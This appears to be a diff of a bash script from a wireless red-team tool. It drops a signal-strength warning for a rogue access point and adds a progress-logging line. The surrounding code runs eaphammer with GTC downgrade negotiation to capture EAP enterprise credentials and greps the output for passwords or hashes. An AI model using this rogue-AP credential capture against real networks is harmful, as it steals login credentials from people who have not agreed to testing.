@@ -23,14 +23,6 @@ C_BOLD="${ASTRA_COLOR_BOLD:-}"
 C_ACTION="${ASTRA_COLOR_ACTION:-}"
 C_RESET="${ASTRA_COLOR_RESET:-}"
 
-# SNR Safeguard (Red Team Hardening)
-if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
-    echo -e "\n[!] WARNING: Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm)."
-    echo "[*] Rogue AP signal will be drowned out by the legitimate AP at this distance."
-    stty sane
-    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET} ")" snr_continue
-    [[ "$snr_continue" != "y" ]] && exit 0
-fi
 
 # Inputs from Environment
 INTERFACE="${MONITOR_INTERFACE:-}"
@@ -60,6 +52,8 @@ if command -v eaphammer &>/dev/null; then
     # Note: eaphammer might require specific configuration or certs
     timeout 60 eaphammer --interface "$INTERFACE" --essid "$SSID" --negotiate gtc --auth wpa2-aes > "$EAP_OUT" 2>&1 || true
     
+    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 90 --status "Checking captured EAP data..."
+
     # Robust parsing for captured credentials
     if awk 'tolower($0) ~ /captured|credential|password|hash/ {exit 0} END {exit 1}' "$EAP_OUT"; then
         echo "[!] SUCCESS: EAP CREDENTIALS CAPTURED!"
